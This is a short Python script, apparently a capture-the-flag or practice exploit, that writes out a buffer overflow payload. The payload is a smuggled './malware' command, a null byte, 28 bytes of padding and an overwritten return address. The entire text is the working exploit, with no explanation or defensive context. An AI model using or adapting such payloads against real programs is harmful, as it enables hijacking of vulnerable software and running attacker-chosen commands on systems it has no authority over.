import sys
payload= b'./malware #'+b'\0'+b'a' * 0x1C+b'\x1b\x12\x40\x00\x00\x00\x00\x00'
sys.stdout.buffer.write(payload)
